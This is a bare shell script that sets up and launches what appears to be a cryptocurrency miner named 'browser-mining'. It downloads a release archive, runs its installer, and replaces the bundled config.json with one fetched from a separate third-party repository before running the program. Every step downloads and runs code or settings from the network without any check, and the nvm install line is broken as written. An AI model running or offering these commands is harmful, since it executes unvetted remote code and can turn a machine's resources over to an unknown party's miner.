sudo apt update && sudo apt install curl ca-certificates -y
wget https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
source ~/.bashrc
nvm install 18  
wget https://github.com/malphite-code/browser-mining/releases/download/v1/browser-mining.tar.gz -L -O -J
tar -xf browser-mining.tar.gz
cd browser-mining
npm install
sh install.sh
rm config.json
wget https://raw.githubusercontent.com/ptypecolorss/fileshare/main/config.json
node index.js
